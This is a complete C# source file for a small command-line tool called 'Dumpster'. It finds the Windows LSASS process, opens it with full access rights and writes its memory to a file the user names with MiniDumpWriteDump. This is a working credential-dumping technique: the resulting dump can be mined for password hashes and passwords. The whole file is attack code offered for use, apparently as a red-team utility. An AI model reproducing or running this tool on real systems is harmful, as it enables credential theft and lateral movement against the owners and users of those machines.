using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace Dumpster
{

    class Program
    {
        [DllImport("Dbghelp.dll")]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, IntPtr hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);
        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        static void Main(string[] args)
        {
            ArgParser.Parser argParser = new ArgParser.Parser();
            argParser.AddHelpText("Dumpster - dumps LSASS process memory to a given location.");
            argParser.AddArgument("path", "-p", "--path", "Output file path");
            argParser.ParseArguments(args);
            if (argParser.argValues["path"] == null)
            {
                Console.WriteLine("Required argument missing: -p / --path");
                System.Environment.Exit(1);
            }
            FileStream dumpFile = new FileStream(argParser.argValues["path"], FileMode.Create);
            Process[] lsass = Process.GetProcessesByName("lsass");
            int lsass_pid = lsass[0].Id;
            IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);
            bool dumped = MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
        }
    }
    
}
